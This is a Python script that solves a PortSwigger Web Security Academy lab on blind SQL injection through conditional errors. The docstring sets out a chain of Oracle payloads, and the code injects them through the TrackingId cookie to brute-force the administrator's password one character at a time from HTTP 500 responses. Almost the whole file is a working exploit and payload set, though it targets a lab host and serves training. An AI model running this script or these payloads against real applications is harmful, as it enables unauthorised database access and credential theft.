import string
import requests

""" Exploiting blind SQL injection by triggering conditional errors
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

The original SQL-query is something like this:
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<TrackingId from cookie>'

https://portswigger.net/web-security/sql-injection/cheat-sheet
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual 

PoC: (put this in cookie as TrackingId)
Error response (HTTP 500):
xyz' union select case when (1=1) then to_char(1/0) else null end from dual -- 
Normal response (HTTP 200):
xyz' union select case when (1=2) then to_char(1/0) else null end from dual -- 

Together with original query
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xyz' union select case when (1=1) then to_char(1/0) else null end from dual -- '

Evolution of exploit:
xyz' union select case when (1=1) then to_char(1/0) else null end from dual -- 
xyz' union select case when (SUBSTR('foobar', 1, 1) = 'x') then to_char(1/0) else null end from dual --
xyz' union select case when (SUBSTR((select username from users where username = 'administrator'), 1, 1) = 'a') then to_char(1/0) else null end from dual -- 
xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), 1, 1) = 'v') then to_char(1/0) else null end from dual -- 
f"xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), 1, {len(to_try)}) = '{to_try}') then to_char(1/0) else null end from dual"
"""

# TODO: change url to challenge url
url = "https://ac3c1f331ee30bb9809058ec00aa00a8.web-security-academy.net/"


def get_candidates_alphanumeric():
    """this challenge only uses lowercase and numbers.
    To be sure - and for future copy/paste - don't forget the uppercase letters"""
    return string.ascii_lowercase + "0123456789" + string.ascii_uppercase


def bruteforce_password(candidates):
    """getting the password, one character at a time"""

    password = ""
    pos = len(password)
    while True:
        pos += 1
        for candidate in candidates:
            to_try = password + candidate

            injection = f"xyz' union select case when (SUBSTR((select password from users where username = 'administrator'), 1, {len(to_try)}) = '{to_try}') then to_char(1/0) else null end from dual"

            payload = injection + " -- "
            # print(f"SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '{payload}'")

            cookies = {"session": "whatever",  # no valid session needed
                       "TrackingId": payload, }

            res = requests.get(url, cookies=cookies, timeout=5)

            if res.status_code == 500:
                password += candidate
                print(password)
                break
            else:
                print(".", end="")
        else:
            print(f" tried all candidates for position {pos}, complete password:", password)
            break

        # unreachable, due to breaks

    return password


if __name__ == '__main__':
    candidates = get_candidates_alphanumeric()
    password = bruteforce_password(candidates)
    print(password)
